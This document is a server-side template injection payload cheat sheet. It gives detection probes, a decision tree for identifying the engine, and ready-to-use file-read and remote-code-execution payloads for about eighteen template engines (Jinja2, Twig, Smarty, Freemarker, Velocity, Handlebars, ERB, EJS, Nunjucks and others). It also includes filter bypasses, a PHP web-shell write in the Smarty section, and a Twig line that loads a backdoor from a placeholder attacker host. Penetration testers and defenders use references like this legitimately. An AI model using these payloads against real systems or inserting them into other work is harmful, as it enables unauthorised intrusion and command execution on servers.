# Server Side Template Injection (SSTI)

> Server-Side Template Injection occurs when user-supplied input is embedded into a template in an unsafe manner, allowing attackers to inject template directives that are executed server-side.

---

## Table of Contents

- [Detection](#detection)
- [Jinja2 (Python)](#jinja2-python)
- [Twig (PHP)](#twig-php)
- [Smarty (PHP)](#smarty-php)
- [Freemarker (Java)](#freemarker-java)
- [Velocity (Java)](#velocity-java)
- [Pebble (Java)](#pebble-java)
- [Mako (Python)](#mako-python)
- [Tornado (Python)](#tornado-python)
- [Chameleon (Python)](#chameleon-python)
- [Groovy](#groovy)
- [Jade / Pug (Node.js)](#jade--pug-nodejs)
- [Handlebars (Node.js)](#handlebars-nodejs)
- [ERB (Ruby)](#erb-ruby)
- [Slim (Ruby)](#slim-ruby)
- [Go Templates](#go-templates)
- [Dot.js (Node.js)](#dotjs-nodejs)
- [EJS (Node.js)](#ejs-nodejs)
- [Nunjucks (Node.js)](#nunjucks-nodejs)
- [References](#references)

---

## Detection

### Polyglot Probe

Use these strings to trigger errors or unexpected output that reveal the template engine:

```
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
@(7*7)
```

### Decision Tree (based on output)

```
Input: {{7*7}}
├── Output: 49       → Jinja2 / Twig
│   ├── {{7*'7'}}
│   │   ├── 49      → Twig
│   │   └── 7777777 → Jinja2
├── No output / error → Try ${7*7}
│   ├── Output: 49  → Freemarker / Smarty
│   └── Try <%= 7*7 %>
│       ├── Output: 49 → ERB (Ruby)
│       └── Try #{7*7}
│           └── Output: 49 → Ruby (Slim)
```

---

## Jinja2 (Python)

### Basic Injection

```
{{7*7}}
{{7*'7'}}
{{config}}
{{config.items()}}
```

### Dump All Variables

```
{{self.__dict__}}
{{request.__dict__}}
{{config.__class__.__init__.__globals__['os'].environ}}
```

### Read File

```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```

### Remote Code Execution

```
{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/exploit','w').write('import os\nos.system("id")')}}
```

```python
# One-liner RCE
{{''.__class__.__bases__[0].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Filter Bypass

```
# Using request.args
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")}}

# Bypassing dot notation
{{''['__class__']['__mro__'][2]['__subclasses__']()}}

# Using |attr filter
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(2)|attr('__subclasses__')()}}

# Concatenation
{{''.join(['__cl','ass__'])}}
```

### Common Subclass Indexes

> Subclass indexes vary by Python version. Enumerate first:

```
{{''.__class__.__mro__[2].__subclasses__()}}
```

| Index (approx.) | Class |
|---|---|
| 40 | `file` (Python 2) |
| 258 | `subprocess.Popen` (Python 3) |
| 408 | `subprocess.Popen` (Python 3, newer) |

### Bypass `_` and `.` filters

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')}}
```

---

## Twig (PHP)

### Basic Injection

```
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
```

### Read File

```
{{'/etc/passwd'|file_excerpt(1,30)}}
{{include('/etc/passwd')}}
```

### Remote Code Execution

```
{{_self.env.setCache("ftp://attacker.com:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

```
{% set cmd = 'id' %}
{% set exec = _self.env.registerUndefinedFilterCallback("exec") %}
{{ _self.env.getFilter(cmd) }}
```

---

## Smarty (PHP)

### Basic Injection

```
{7*7}
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### RCE via `{php}` tag (Smarty < 3.1.30)

```
{php}system('id');{/php}
```

### RCE without `{php}` tag

```
{self::clearConfig()}
{$smarty.template_object->smarty->registerPlugin('modifier','passthru','passthru')}{$smarty.template_object->smarty->registerPlugin('modifier','system','system')}{'id'|system}
```

---

## Freemarker (Java)

### Basic Injection

```
${7*7}
#{7*7}
${freeMarker.version}
${product.class.protectionDomain.codeSource.location}
```

### Read File

```
${product.class.forName('freemarker.template.utility.Execute').newInstance()}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Remote Code Execution

```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

```
<#assign classLoader=product.class.protectionDomain.codeSource.location.openConnection().class.forName('java.lang.ClassLoader').getMethod('getSystemClassLoader').invoke(null)>
${classLoader.loadClass("freemarker.template.utility.Execute").newInstance()("id")}
```

### API Access (Freemarker 2.3.22+)

```
<#assign classLoader=object?api.class.protectionDomain.codeSource.location.openConnection().class.forName("java.lang.ClassLoader").getMethod("getSystemClassLoader").invoke(null)>
```

---

## Velocity (Java)

### Basic Injection

```
#set($x = 7*7)${x}
$x
${class.getClassLoader()}
```

### Read File

```
#foreach($i in [1..$ex])
#set($str=$i.class.forName("java.lang.String"))
#end
```

### Remote Code Execution

```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.inputStream)
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

```
#set($e="e")
$e.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
```

---

## Pebble (Java)

### Basic Injection

```
{{7*7}}
{{someString.toUPPERCASE()}}
```

### Remote Code Execution

```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance([bytes]) }}
```

---

## Mako (Python)

### Basic Injection

```
${7*7}
${config}
```

### Remote Code Execution

```
<%
import os
x=os.popen('id').read()
%>
${x}
```

```
${__import__('os').popen('id').read()}
```

---

## Tornado (Python)

### Basic Injection

```
{{7*7}}
```

### Remote Code Execution

```
{% import os %}{{os.popen('id').read()}}
```

---

## Chameleon (Python)

### Basic Injection

```
${7*7}
```

### Remote Code Execution

```
${''.join(__import__('os').popen('id').read())}
```

---

## Groovy

### Basic Injection

```
${7*7}
```

### Remote Code Execution

```
${[1].class.forName("java.lang.Runtime").getMethod("exec","".class).invoke([1].class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

```groovy
<%=[1].class.forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance([["id"]]).start().text%>
```

---

## Jade / Pug (Node.js)

### Basic Injection

```
#{7*7}
```

### Remote Code Execution

```
#{function(){localLoad=global.process.mainModule.constructor._resolveFilename('child_process');child_process=localLoad.call(null,'child_process');return child_process.execSync('id').toString()}()}
```

```
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id')
```

---

## Handlebars (Node.js)

### Basic Injection

```
{{7*7}}
```

### Remote Code Execution

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## ERB (Ruby)

### Basic Injection

```
<%= 7*7 %>
<%= File.open('/etc/passwd').read %>
```

### Remote Code Execution

```
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('id') %><%= @b.readline() %>
```

---

## Slim (Ruby)

### Basic Injection

```
#{7*7}
```

### Remote Code Execution

```
#{ `id` }
#{system('id')}
```

---

## Go Templates

### Basic Injection

```
{{.}}
{{printf "%s" "hello"}}
```

### Read Internal Data

```
{{.}}                        // dumps the entire data object
{{.FieldName}}               // access struct field
```

> Go templates do not have built-in functions for OS command execution. RCE requires custom template functions registered by the application. Look for custom `FuncMap` entries.

### Traversal / Information Disclosure

```
{{range $k,$v := .}}{{$k}}={{$v}},{{end}}
```

---

## Dot.js (Node.js)

### Basic Injection

```
{{= 7*7}}
```

### Remote Code Execution

```
{{= global.process.mainModule.require('child_process').execSync('id').toString()}}
```

---

## EJS (Node.js)

### Basic Injection

```
<%= 7*7 %>
```

### Remote Code Execution

```
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

```
<% var require = global.require || global.process.mainModule.constructor._resolveFilename; %>
<% var exec = require('child_process').exec; %>
<% exec('id', function(err, stdout){res.end(stdout)}) %>
```

---

## Nunjucks (Node.js)

### Basic Injection

```
{{7*7}}
```

### Remote Code Execution

```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

```
{{global.process.mainModule.require('child_process').execSync('id').toString()}}
```

---

## References

- OWASP Testing Guide — Server-Side Template Injection
- PortSwigger Web Security Academy — SSTI
- HackTricks — SSTI
- Template Engine Documentation:
  - [Jinja2 Docs](https://jinja.palletsprojects.com/)
  - [Twig Docs](https://twig.symfony.com/)
  - [Freemarker Docs](https://freemarker.apache.org/)
  - [Velocity Docs](https://velocity.apache.org/)
